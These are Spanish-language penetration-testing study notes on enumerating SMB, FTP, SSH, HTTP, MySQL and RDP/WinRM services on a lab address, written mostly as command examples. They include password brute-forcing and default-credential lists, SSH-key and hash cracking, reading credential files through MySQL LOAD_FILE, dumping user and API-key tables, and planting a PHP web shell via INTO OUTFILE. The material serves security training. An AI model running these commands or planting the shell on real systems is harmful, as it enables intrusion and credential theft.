# Enumeración de servicios

Es el proceso de extraer información detallada de los servicios corriendo en los puertos abiertos que hemos identificado durante el scaneo.

La enumeración de servicios provee: 

- Versión del servicio
- Cuentas de usuario y grupos
- Recursos compartidos
- Configuración de red y topologia
- Detalles del sistema operativo 
- Configuraciones erroneas de seguridad
- Credenciales predeterminadas y contraseñas debiles
- Bases de datos accesibles y aplicaciones

## Enumeración especifica 

| Servicio | Puerto | Herramientas |
| :---: | :--- | :--- |
| SMB/SAMBA | 445,139 | enum4linux, smbclient, smbmap, crackmapexec |
| FTP | 21 | ftp, nmap scripts (ftp-anon, ftp-bounce) |
| SSH | 22 | ssh, hydra, nmap scripts (ssh-auth-service) |
| HTTP/HTTPS | 80,443 | gobuster, nikto, dirb, burp suite, curl |
| MySQL | 3306 | mysql client, nmap scripts (mysql-*) |
| RDP | 3389 | xfreerdp, rdesktop, nmap scripts |

## Metodología de Enumeración

1. Preparar

- Revisar los resultados del escaneo de puertos
- Identificar los servicios a enumerar
- Priorizar las victimas de gran valor
- Crear una estructura de documentación 

2. Reconocimiento inicial

- Reconocimiento de los banners de los servicios
- Testear acceso anonimo
- Testear credenciales predeterminadas
- Ejecutar scripts automatizados de nmap

3. Enumeración profunda

- Usar herramientas especializadas por servicio
- Extraer cuentas de usuario, configuraciones y recursos compartidos
- Identificar malas configuraciones y debilidades
- Mapear potenciales vectores de ataque

4. Documentar y analizar

- Organizar hallazgos por servicio
- Relacionar usuarios en los servicios
- Identificar vulnerabilidades por versión especifica del servicio
- Preparar el objetivo para la fase de explotación

## SMB/SAMBA

Server Message Block es un protocolo de red compartida de archivos para leer y escribir archivos y pedir servicios de hosts, se usa mayormente en Windows pero también se soporta en Linux/Unix vía SAMBA

SMB -> Windows 
SAMBA -> Linux/Unix
NetBIOS -> Nombre Legacy del servicio (PUERTO 139)
Direct SMB -> Implementación moderna (PUERTO 445)

PUERTOS COMUNES

- 139: Legacy SMB tcp
- 445: Direct SMB tcp
- 137: NetBIOS udp service
- 138: NetBIOS udp service datagram

Es importante porque revela: 

- Cuentas de usuario
- Folders compartidos
- Información de dominio
- Politicas de contraseñas
- Membresias de grupo 
- Acceso a sesiones nulas

Herramientas para enumerar SMB: 

- enum4linux
- smbclient
- smbmap
- crackmapexec
- rpcclient
- nmap NSE

```sh
nmap -p 139,445 --script "smb-*" 192.168.1.10
smbclient -L //192.168.1.10 -N
smbmap -H 192.168.1.10
rpcclient -U "" -N 192.168.1.10
enum4linux -a 192.168.1.10
```

Para CrackMapExec SMB

```sh
crackmapexec smb 192.168.1.10

# NULL SESION
crackmapexec smb 192.168.1.10 -u '' -p ''

#ENUMERAR
crackmapexec smb 192.168.1.10 -u '' -p '' --[shares, users]

#POLITICAS DE CONTRASEÑA
crackmapexec smb 192.168.1.10 --pass-pol
```

Si las sesiones nulas están desactivadas, todavía se pueden enumerar usuarios con metodos alternativos:

RID Cycling

```sh
enum4linux -r 192.168.1.10

enum4linux -R 500-600 192.168.1.10
```

Usando Kerberos (PUERTO 88)

```sh
kerbrute userenum --dc 192.168.1.10 -d domain.local userlist.txt

nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='domain.local' 192.168.1.10
```

Si se tiene SMBv1 hay que intentar el EternalBlue (MS17-010) exploit

## Enumeración FTP

- PORT 21: CONEXIÓN DE CONTROL
- PORT 20: CONEXIÓN DE DATA
- PROTOCOLO DE TEXTO CLARO: LAS CREDENCIALES SE ENVÍAN DESENCRIPTADAS
- MODO ACTIVO/PASIVO: DIFERENTES METODOS DE CONEXIÓN
- ACCESO ANONIMO: CONFIGURACIÓN ERRONEA

| FTP | Vulnerabilidades | Revisar |
| :---: | :--- | :--- |
| vsftpd 2.3.4 | Backdoor | Remote code execution |
| ProFTPD 1.3.3c | mod_copy vulnerability | Arbitrary file copy |
| Pure-FTPd | Various buffer overflows | Version-especific exploits |
| FileZilla Server | Weak authentication | Default credentials |

```sh
nmap -p 21 -sV 192.168.1.10

nmap -p 21 --script ftp-anon 192.168.1.10

nmap -p 21 --script ftp-bounce 192.168.1.10

nmap -p 21 --script ftp-* 192.168.1.10

nmap -p 21 --script ftp-brute --script-args userdb=users.txt ,passdb=passwords.txt 192.168.1.10
```

Para probar el login anomimo de FTP:

```sh
ftp 192.168.1.10

# Username: anonymous
# Password: Enter o anonymous@domain.com

ftp anonymous@192.168.1.10
```

Comandos FTP:

- ls
- ls -la
- pwd 
- cd 
- get filename
- mget *
- put localfile
- mput *
- mkdir newdir
- delete filename
- binary
- ascii
- passive
- status
- system
- quit

FTP Banner Grabbing:

```sh
nc -nv 192.168.1.10 21

telnet 192.168.1.10 21

nmap -p 21 -sV --script banner 192.168.1.10

ftp 192.168.1.10
```

## Enumeración SSH

Caracteristicas:

- PORT 22
- Comunicación encriptada
- Metodos de autenticación
- Versión 1 vs 2
- Información del banner

| Versión | Notas | Status |
| :---: | :---: | :--- |
| SSH-1.x | Multiples vulnerabilidades | DEPRECATED |
| SSH-2.x | Encripción segura | RECOMMENDED |
| OpenSSH < 7.4 | Enumeración de usuarios vulnerable | VULNERABLE |
| OpenSSH < 7.7 | Enumeración de usuarios via timing | VULNERABLE |

```sh
nc -nv 192.168.1.10 22

telnet 192.168.1.10 22

ssh 192.168.1.10

nmap -p 22 -sV --script banner 192.168.1.10

echo "exit" | ssh -v 192.168.1.10 2>&1 | grep "remote software version"
```

Metodos de enumeración: 

```sh
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=root" 192.168.1.10

nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=admin" 192.168.1.10

ssh -v root@192.168.1.10
```

Enumeración OpenSSH: 

```
msfconsole

use auxiliary/scanner/ssh/ssh_enumusers

set RHOST 192.168.1.10

set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt 

run 

# Usando script de python

python ssh-user-enum.py --target 192.168.1.10 --userList users.txt

# Manualmente

time ssh invalid_user@192.168.1.10
time ssh root@192.168.1.10
```

Enumeración de algoritmos SSH:

```
nmap -p 22 --script ssh2-enum-algos 192.168.1.10

ssh -vv 192.168.1.10 2>&1 | grep "kex_algorithms\| server_host_key_algorithms\|ciphers"

ssh-audit 192.168.1.10
```

Ataques de contraseñas SSH: 

Probar contraseñas comunes

- root
- toor
- password 
- admin 
- password123
- ubuntu

Autenticación basada en KEYS

Si la autenticación con contraseñas está desabilitado o encuentras SSH KEYS, la autenticación basada en KEYS es el camino a seguir

```sh
ssh -i private_key.pem user@192.168.1.10

chmod 600 private_key.pem

#Crackear las key
python /usr/share/john/ssh2john.py private_key.pem > key_hash.txt
john key_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Enumeración HTTP/HTTPS

- PUERTO 80 HTTP
- PUERTO 443 HTTPS
- PUERTOS ALTERNATIVOS 8080, 8000, 8888

Banner Grabbing:

```sh
curl -I http://192.168.1.10

nc 192.168.1.10 80
HEAD / HTTP/1.0

nmap -p 80 --script http-headers 192.168.1.10

whatweb http://192.168.1.10
```

Fuerza bruta a directorios 

```sh
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlist/dirb/common.txt -x php,html,txt,py,ssh,zip,sql,bak -b 404,403 -a "Mozilla/5.0"

dirb http://192.168.1.10 /usr/share/wordlist/dirb/big.txt -X .php,.txt,.html,.py,.ssh
```

Vulnerabilidades web:

```sh
nikto -h http://192.168.1.10 -o nikto_results.txt -p 8080
```

Enumeración manual:

```sh
curl http://192.168.1.10/robots.txt

curl http://192.168.1.10/sitemap.xml

curl http://192.168.1.10/README.txt

curl http://192.168.1.10/CHANGELOG.txt
```

## Enumeración MySQL

PUERTO DEFAULT: 3306

Detección de versión:

```sh
nmap -p 3306 -sV 192.168.1.10
nmap -p 3306 --script mysql-info 192.168.1.10
nmap -p 3306 --script mysql-* 192.168.1.10
nmap -p 3306 --script mysql-empty-password 192.168.1.10
nmap -p 3306 --script mysql-databases --script-args mysqluser=root ,mysqlpass=root 192.168.1.10
```

Login Testing:

```sh
mysql -h 192.168.1.10 -u root
mysql -h 192.168.1.10 -u root -p

# Credenciales predeterminadas
mysql -h 192.168.1.10 -u root -p root
mysql -h 192.168.1.10 -u root -p password
mysql -h 192.168.1.10 -u admin -p admin
mysql -h 192.168.1.10 -u ''
```

Comandos MySQL:

- SHOW DATABASES;
- USE DATABASE_NAME;
- SHOW TABLES;
- DESCRIBE table_name;
- SELECT * FROM users:
- SELECT user();
- SELECT current_user();
- SHOW GRANTS;
- SELECT user, host from mysql.user;
- SELECT user, authentication_string FROM mysql.user;

EXTRACCIÓN DE DATA SENSIBLE:

```sql
USE webapp_db;

SELECT * FROM users;
SELECT username, password, email FROM users;

SELECT * FROM users WHERE role='admin';
SELECT * FROM users WHERE is_admin=1;

SELECT * FROM password_resets;

SELECT * FROM api_keys;
SELECT * FROM config WHERE key LIKE '%password%';

SELECT * FROM users INTO OUTFILE '/tmp/users.txt';
```

Si se encuentran hashes de passwords:

```sql
# 32 caracteres = MD5
# 40 caracteres = SHA1
# 60 caracteres = bcrypt

hash-identifier

echo "daisd121iasdiasdiadi21" > hash.txt

# CRACK MD5 

john --format=Raw-MD5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

john --show hash.txt
```

Tecnicas avanzadas MySQL:

Si MySQL tiene privilegios de archivo, puede leer archivos del sistema

```sql
SELECT file_priv FROM mysql.user WHERE user='root';

SELECT LOAD_FILE('/etc/passwd');

SELECT LOAD_FILE('/var/www/html/config.php');

SELECT LOAD_FILE('/home/user/.ssh/id_rsa');

#SUBIR ARHCIVOS AL SISTEMA
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

# LUEGO SE PUEDE ACCEDER POR NAVEGADOR: http://192.168.1.10/shell.php?cmd=whoami
```

## Enumeración de RDP & WINRM

PUERTOS POR DEFAULT:

- PORT 3389 RDP
- PORT 5985 HTTP
- PORT 5986 HTTPS

Importan porque proveen una GUI/shell de acceso a sistemas Windows

Enumeración de RDP:

```sh
nmap -p 3389 -sV 192.168.1.10

nmap -p 3389 --script rdp-ntlm.info 192.168.1.10

nmap -p 3389 -script rdp-vuln-ms12-020 192.168.1.10

nmap -p 3389 -script rdp-enum-encryption 192.168.1.10
```

RDP Login Testing 

```sh
xfreerdp /u:administrator /p:password /v:192.168.1.10

xfreerdp /u:DOMAIN\\username /p:password /v:192.168.1.10

xfreerdp /u:administrator /v:192.168.1.10

rdesktop -u administrator -p password 192.168.1.10
```

WinRM Connection Testing

```sh
evil-winrm -i 192.168.1.10 -u administrator -p password

evil-winrm -i 192.168.1.10 -u administrator -p password -d DOMAIN

crackmapexec winrm 192.168.1.10 -u administrator -p password 

crackmapexec winrm 192.168.1.10 -u users.txt -p passwords.txt 
```

